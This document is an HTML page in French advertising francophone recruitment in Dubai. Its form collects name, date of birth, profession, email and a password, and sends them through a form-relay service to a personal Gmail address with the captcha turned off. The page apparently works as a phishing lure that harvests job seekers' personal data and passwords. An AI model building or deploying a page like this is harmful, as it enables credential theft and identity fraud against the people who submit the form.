<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recrutement sur Dubaï francophone</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h1>Recrutement sur Dubaï francophone</h1>
        <div class="image-slider">
            <img src="" alt="Dubai" id="sliderImage">
        </div>
        <form id="recruitmentForm" class="recruitment-form" action="https://formsubmit.co/username240920055@gmail.com" method="POST">
            <div class="input-group">
                <input type="text" id="nom" name="nom" required>
                <label for="nom">Nom</label>
            </div>
            <div class="input-group">
                <input type="text" id="prenom" name="prenom" required>
                <label for="prenom">Prénom</label>
            </div>
            <div class="input-group">
                <input type="text" id="dateNaissance" name="dateNaissance" placeholder="jj/mm/aaaa" required>
                <label for="dateNaissance">Date de naissance</label>
            </div>
            <div class="input-group">
                <input type="text" id="profession" name="profession" required>
                <label for="profession">Profession</label>
            </div>
            <div class="input-group">
                <input type="email" id="email" name="email" required>
                <label for="email">Email</label>
            </div>
            <div class="input-group">
                <input type="password" id="motDePasse" name="motDePasse" required>
                <label for="motDePasse">Mot de passe</label>
            </div>
            <button type="submit">S'inscrire</button>
            <input type="hidden" name="_captcha" value="false">
        </form>
    </div>
    <script src="script.js"></script>
</body>
</html>
